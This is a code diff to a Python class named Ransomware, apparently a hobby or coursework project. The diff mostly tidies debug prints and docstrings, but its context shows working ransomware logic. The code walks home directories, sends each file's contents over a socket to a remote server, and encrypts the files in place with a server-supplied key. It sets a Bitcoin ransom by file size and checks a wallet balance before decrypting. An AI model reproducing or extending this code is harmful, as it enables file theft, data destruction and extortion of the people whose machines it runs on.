@@ -68,8 +68,7 @@ class Ransomware:
         return self._socket
 
 
-    def send_file_to_server(self, file_path, filename):
-    
+    def send_file_to_server(self, file_path, filename):    
         """ Opening and reading the file data. """
         file = open(file_path, "r", encoding = "ISO-8859-1")
 
@@ -77,17 +76,14 @@ class Ransomware:
         self._socket.sendall(base64.b64encode(filename.encode(Ransomware.ENCODING)))
         time.sleep(0.01)
         msg = base64.b64decode(self._socket.recv(Ransomware.MAX_SIZE)).decode(Ransomware.ENCODING)
-        print(f"[SERVER]: {msg}")
 
         while True:
             data = file.read(1024)
-            print(data)
             if not data:
                 break
             """ Sending the file data to the server. """
             self._socket.sendall(base64.b64encode(data.encode(Ransomware.ENCODING)))
             msg = base64.b64decode(self._socket.recv(Ransomware.MAX_SIZE)).decode(Ransomware.ENCODING)
-            print(f"[SERVER]: {msg}")
 
         """ Closing the file. """
         file.close()
@@ -95,11 +91,10 @@ class Ransomware:
         time.sleep(0.01)
         self._socket.send(base64.b64encode("FILEDONE\n".encode(Ransomware.ENCODING)))
         msg = base64.b64decode(self._socket.recv(Ransomware.MAX_SIZE)).decode(Ransomware.ENCODING)
-        print(f"[SERVER]: {msg}")
 
 
     def get_balance(self, wallet_address):
-    
+        """Retrieves the balance of the crypto wallet using the URL."""
         # API endpoint URL for retrieving wallet balance from blockchain.com API
         balance_url = "https://live.blockcypher.com/btc-testnet/address/" + wallet_address
         decimal_pattern = r'\d+\.\d+'
@@ -107,7 +102,6 @@ class Ransomware:
 
         # Make API request to retrieve wallet balance
         response = requests.get(balance_url)
-        print(response.status_code)
         if response.status_code == 200:
             response_text = response.text
             index =  response_text.find("balance of")
@@ -119,13 +113,13 @@ class Ransomware:
 
 
     def check_if_user_has_paid(self, initial_bal):
+        """Checks if a user has paid, if somebody has paid then it returns true, if nobody has it returns false."""
         current_balance = self.get_balance(wallet_address)
         change = current_balance - initial_bal
         
-        print("balance changed by: " + str(change))
-        print("Required change: " + str(bitcoin_needed))
-        print(change > (float(bitcoin_needed) - 0.0001) and change < float(bitcoin_needed) + 0.0001)
+        print('Payment has been made: '+ str(change > (float(bitcoin_needed) - 0.0001) and change < float(bitcoin_needed) + 0.0001))
 
+        # Checks whether the payment has been made.
         if (change > (float(bitcoin_needed) - 0.0001) and change < float(bitcoin_needed) + 0.0001):
             return True
         else:
@@ -135,9 +129,8 @@ class Ransomware:
         
 
 
-    # Method that lists all of the non-hidden, non-vital  directories bellow the inserted directory
     def list_safe_directories(self, directory):
-
+        " Lists all of the non-hidden, non-vital  directories bellow the inserted directory."
         result = []
         excluded_dirs = set([".", "..", ".Trash-1000", ".config", ".local", ".cache"])
 
@@ -151,8 +144,8 @@ class Ransomware:
 
         return result  # Return the list of directories
 
-    # Method that retrieves all of the files in a directory and purposely does not include the ransomeware
     def get_files_in_dir(self, directory):
+        "Retrieves all of the files in a directory and purposely does not include the ransomeware."
         # change to home directory so that the paths are correct relative paths.
         os.chdir(directory)
 
@@ -169,17 +162,15 @@ class Ransomware:
     def establish_connection(self):
         """ Create a connection to the server. """
         try:
-            print(self._host)
+            print('Connection established to the server')
             self.socket.connect((self._host, self._port))
         except socket.error:
-            logging.debug('Dropper could not connect to the server.')
             return
 
 
 
     # Method for encrypting a single file
     def encrypt_file(self, file, key):
-        print("started")
         with open(file, "rb") as the_file:
             contents = the_file.read()
             
@@ -198,10 +189,8 @@ class Ransomware:
                 with open(file, "ab") as f:
                     f.write(enc_chunk)
                     
-        print("terminated")
-
-
     def calulate_bitcoin(self, size_of_files):
+        "Calculate number of bitcoin needed to be paid."
         global bitcoin_needed
         bitcoin_needed = str((size_of_files/100000000))
 
@@ -219,13 +208,15 @@ class Ransomware:
                 size_of_files += file_size
                 number_of_files += 1
                 
-                print("filename: "+file)
 
                 # Send file to server
                 self.send_file_to_server(file_path, file)
                 
                 # Encrypt file
                 self.encrypt_file(file_path, key)
+
+                print("Encrypted and sent "+file)
+
         
         self._socket.sendall(base64.b64encode("DONE.".encode(Ransomware.ENCODING)))
 
@@ -234,8 +225,10 @@ class Ransomware:
         
         #Update the amount of bitcoin that we want glboabbly
         self.calulate_bitcoin(size_of_files)
+        print('Bitcoins to be paid: '+bitcoin_needed)
 
     def decrypt_file(self, file_path, key):
+        "Decrypts a file."
         with open(file_path, "rb") as file:
             encrypted_contents = file.read()
 
@@ -262,6 +255,7 @@ class Ransomware:
 
             
     def decrypt_all_files(self, directory, key):
+        "Decrypting all the files that is in the safe directories."
         dir_list = self.list_safe_directories(directory)
         for dir in dir_list:
             for file in self.get_files_in_dir(dir):
@@ -270,21 +264,20 @@ class Ransomware:
                     self.decrypt_file(file_path, key)
 
     def execute_attack(self):
-        
+        """Attacks the victims machine by receiving the public key to encrypt all the files."""
+
         self.establish_connection()
         
         """ Receiving the public key. """
         filename = base64.b64decode(self._socket.recv(Ransomware.MAX_SIZE)).decode("utf-8")
-        print(f"[RECV] Receiving the public key.")
         file = open(filename, "w")
         self._socket.sendall(base64.b64encode("Public key filename received.".encode("utf-8")))
  
         """ Receiving the public key from the server. """
         data = base64.b64decode(self._socket.recv(Ransomware.MAX_SIZE)).decode("utf-8")
         file.write(data)
-        print(f"[RECV] Receiving the public key data.")
+        print("Received public key")
         self._socket.sendall(base64.b64encode("File data received".encode("utf-8")))
-        print("data: "+data)
  
         """ Closing the file. """
         file.close()
@@ -340,8 +333,6 @@ class Ransomware:
                     """ Receiving the private key. """
                     filename = base64.b64decode(self._socket.recv(2048)).decode(Ransomware.ENCODING)
                     filename = 'private_key.pem'
-                    print(f"[RECV] Receiving the private key")
-                    print("filename: " + filename)
 
                     key = open(filename, "wb")
                     self._socket.sendall(base64.b64encode("Private key filename received.".encode(Ransomware.ENCODING)))
@@ -349,7 +340,7 @@ class Ransomware:
                     """ Receiving the private key from the server. """
                     data = base64.b64decode(self._socket.recv(Ransomware.MAX_SIZE))
                 
-                    print(f"[RECV] Receiving the private key data.")
+                    print("Received public key")
                     key.write(data)
                     self._socket.sendall(base64.b64encode("File Data recieved.".encode(Ransomware.ENCODING)))
                 
